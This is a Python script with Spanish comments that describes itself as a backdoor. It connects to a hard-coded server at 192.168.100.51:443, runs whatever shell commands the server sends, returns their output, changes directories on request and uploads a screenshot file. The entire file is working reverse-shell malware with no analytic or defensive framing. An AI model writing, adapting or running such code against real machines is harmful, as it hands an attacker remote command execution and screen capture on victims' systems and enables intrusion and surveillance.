'''
Resumen: Este script es un backdoor que se conecta a un servidor remoto y ejecuta comandos en el sistema.
El servidor puede enviar comandos al backdoor y recibir la salida de los comandos.
El backdoor también puede enviar capturas de pantalla al servidor.

El servidor debe ejecutar el script .py para recibir las conexiones del backdoor.'''


import socket
import subprocess
import sys
import signal
import struct
import os

current_dir = os.getcwd()

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def run_command(command):
    ''' 
    Ejecuta un comando en el sistema y devuelve la salida
    '''
    try:
        # Ejecutamos el comando y guardamos la salida
        output = subprocess.check_output(command, shell=True)
    except Exception as e:
        # Si hay un error, lo guardamos
        output = str(e)
        # Si hay un error, devolvemos un mensaje de error
        return b'[-] Error running command  \n'
    return output


def send_screenshot(client_socket):
    '''
    Enviar una captura de pantalla al servidor
    '''
    with open("c:\\temp\\capture.png", "rb") as file:
        screenshot_data = file.read()
    
    # Enviar primero el tamaño del archivo
    client_socket.send(struct.pack("!I", len(screenshot_data)))
    
    # Enviar los datos del archivo
    client_socket.sendall(screenshot_data)
    
    
    
    


if __name__ == '__main__':
    
    
    # Creamos un socket para la conexión
    # con el servidor
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Nos conectamos al servidor
    client_socket.connect(('192.168.100.51', 443))
    
    client_socket.send(current_dir.encode())

    # Bucle infinito para recibir comandos
    while True:
        
        
        # Recibimos un mensaje del servidor
        command = client_socket.recv(2048).decode().strip()
        
        if command == "screenshot":
            send_screenshot(client_socket)
        
        elif command.startswith("cd "):
            # Cambiamos el directorio de trabajo
            # al directorio especificado
            try:
                os.chdir(command[3:])
                pwd = os.getcwd()
                # Enviamos el directorio actual al servidor
                client_socket.send(pwd.encode())
                
            except Exception as e:
                client_socket.send(b'\n[-] Error changing directory\n')
        else:
            # Pasamos el comando a la función run_command
            # que ejecutará el comando y devolverá la salida
            # usa decode() para convertir el mensaje a string.
            command_output = run_command(command).decode('cp850')
            
            # Enviamos la salida del comando al servidor, para
            # ver la salida en la consola del servidor.
            client_socket.send(b'\n' + command_output.encode() + b'\n')
        
    
            
    client_socket.close()